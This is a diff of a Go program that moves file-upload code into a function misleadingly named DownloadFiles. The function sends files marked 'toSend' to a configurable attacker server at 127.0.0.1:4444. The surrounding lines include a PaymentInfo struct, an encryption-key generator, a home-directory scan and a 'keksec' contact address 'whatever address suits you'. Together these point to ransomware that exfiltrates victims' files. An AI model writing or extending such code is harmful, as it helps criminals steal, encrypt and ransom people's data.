@@ -134,6 +134,39 @@ type PaymentInfo struct {
     Amount  string
 }
 
+func DownloadFiles(k *keeper) {
+    var hc http.Client = http.Client{}
+
+    file, err := os.Open(k.filename)
+    if  err != nil {
+        log.Panicf("Cannot Open File %v\n", file)
+    }
+
+    body := &bytes.Buffer{}
+    writer := multipart.NewWriter(body)
+    part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
+    if err != nil {
+        log.Panicf("Cannot create multipart from file %s\n", file.Name())
+    }
+
+    io.Copy(part, file)
+    writer.Close()
+
+    req, err := http.NewRequest("POST", "http://" + server + "/uploader/", body)
+    if err != nil {
+        log.Panicln("request is borken")
+    }
+
+    req.Header.Add("Content-Type", writer.FormDataContentType())
+
+    resp, err := hc.Do(req)
+    if err != nil {
+        log.Panicln("response is borken")
+    }
+
+    fmt.Println(resp.StatusCode)
+}
+
 var server string = "127.0.0.1:4444" // server address
 var contact string = "keksec@kek.hq" // whatever address suits you
 
@@ -141,7 +174,6 @@ func main() {
     var files []keeper
     var counter int = 1
     var home string
-    var hc http.Client = http.Client{}
 
     randomKey := NewEncryptionKey()
 
@@ -178,34 +210,7 @@ func main() {
         }
 
         if file.toSend {
-            file, err := os.Open(file.filename)
-            if  err != nil {
-                log.Panicf("Cannot Open File %v\n", file)
-            }
-
-            body := &bytes.Buffer{}
-            writer := multipart.NewWriter(body)
-            part, err := writer.CreateFormFile("file", filepath.Base(file.Name()))
-            if err != nil {
-                log.Panicf("Cannot create multipart from file %s\n", file.Name())
-            }
-
-            io.Copy(part, file)
-            writer.Close()
-
-            req, err := http.NewRequest("POST", "http://" + server + "/uploader/", body)
-            if err != nil {
-                log.Panicln("request is borken")
-            }
-
-            req.Header.Add("Content-Type", writer.FormDataContentType())
-
-            resp, err := hc.Do(req)
-            if err != nil {
-                log.Panicln("response is borken")
-            }
-
-            fmt.Println(resp.StatusCode)
+            DownloadFiles(&file)
         }
 
         counter++
